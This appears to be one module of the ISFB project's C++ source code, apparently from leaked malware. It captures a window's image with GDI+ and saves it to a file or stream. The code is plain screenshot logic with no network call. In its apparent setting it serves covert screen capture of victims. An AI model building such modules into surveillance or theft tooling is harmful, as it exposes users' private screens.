//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: scrshot.cpp
// $Revision: 367 $
// $Date: 2014-10-07 17:26:07 +0400 (Вт, 07 окт 2014) $
// description:
//	Window screenshot generation routines

#include "..\common\main.h"
#include "..\common\memalloc.h"
#include <GdiPlus.h>

//
//	Obtains encoder class ID for the specified image format.
//
extern "C"
WINERROR ScrGetEncoderClsid(
	const WCHAR*	format, 
	CLSID*			pClsid
	)
{
	Gdiplus::GdiplusStartupInput input;
	ULONG_PTR token;
	PVOID MemToFree = NULL;
	
	Gdiplus::Status status = Gdiplus::GdiplusStartup(&token, &input, 0);
		
	if (status == Gdiplus::Ok)
	{
		UINT num = 0;
		UINT size = 0;

		Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

		Gdiplus::GetImageEncodersSize(&num, &size);
		
		if(size == 0)
		{
			return ERROR_UNSUCCESSFULL;
		}

		pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(AppAlloc(size));
		
		if(pImageCodecInfo == NULL)
		{
			return ERROR_UNSUCCESSFULL;
		}

		GetImageEncoders(num, size, pImageCodecInfo);

		for(UINT i = 0; i < num; ++i)
		{
			if(wcscmp(pImageCodecInfo[i].MimeType, format) == 0 )
			{
				MemToFree = (PVOID)pImageCodecInfo;
				*pClsid = pImageCodecInfo[i].Clsid;
				AppFree(MemToFree);
				
				return NO_ERROR;
			}
		}

		MemToFree = (PVOID)pImageCodecInfo;
		AppFree(MemToFree);
	}

	return ERROR_UNSUCCESSFULL;
}



//
//	Generates a screensot of the specified window and saves it into the specified file.
//
extern "C"
WINERROR ScrGenerateImage(
	HWND		hWnd,		// window to genereate a screenshot
	HBITMAP*	pBitmap,
	HBITMAP*	pSource
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	HDC		hCompDc, hDc;
	RECT	Rect;
	HBITMAP hBmp, hOldBmp, hNewBmp;

	if (hDc = GetWindowDC(hWnd))
	{
		if (GetWindowRect(hWnd, &Rect) && Rect.left < Rect.right && Rect.top < Rect.bottom)
		{
			if (hCompDc = CreateCompatibleDC(hDc))
			{
				if (hBmp = CreateCompatibleBitmap(hDc, Rect.right - Rect.left, Rect.bottom - Rect.top))
				{
					if (hOldBmp = (HBITMAP)SelectObject(hCompDc, hBmp))
					{
						// Generating a screenshot image
						if (BitBlt(hCompDc, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, hDc, 0, 0, SRCCOPY))
						{
							if (hNewBmp =(HBITMAP)SelectObject(hCompDc, hOldBmp))
							{
								*pBitmap = hNewBmp;
								*pSource = hBmp;
								Status = NO_ERROR;
							}	// if (hNewBmp =(HBITMAP)SelectObject(hCompDc, hOldBmp))
						}	// if (BitBlt(hCompDc, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, hDc, 0, 0, SRCCOPY))
					}	// if (hOldBmp = (HBITMAP)SelectObject(hCompDc, hBmp))
					if (Status != NO_ERROR)
						DeleteObject(hBmp);
				}	// if (hBmp = CreateCompatibleBitmap(hDc, Rect.right - Rect.left, Rect.bottom - Rect.top))
				DeleteDC(hCompDc);
			}	// if (hCompDc)
		}	// if (GetWindowRect(hWnd, &Rect) && Rect.left < Rect.right && Rect.top < Rect.bottom)
	}	// if (hDc = GetWindowDC(hWnd))

	return(Status);
}


//
//	Generates a screensot of the specified window and saves it into the specified file.
//
extern "C"
WINERROR ScrMakeScreenshot(
	HWND			hWnd,		// window to genereate a screenshot
	LPWSTR			pFilePath,	// file path to store the screenshot
	LPSTREAM		pStream,	// stream to store the screenshot
	const CLSID*	pClsId		// image encoder class ID
	)
{
	WINERROR Status;
	HBITMAP hSource, hBitmap;

	if ((Status = ScrGenerateImage(hWnd, &hBitmap, &hSource)) == NO_ERROR)
	{
		Gdiplus::Bitmap Bitmap(hBitmap, NULL);

		if (pFilePath)
			// Saving image into the specified file
			Bitmap.Save(pFilePath, pClsId);
	
		if (pStream)
			// Writing image into the specified stream
			Bitmap.Save(pStream, pClsId);

		DeleteObject(hSource);
	}	// if (hDc = GetWindowDC(hWnd))

	return(Status);
}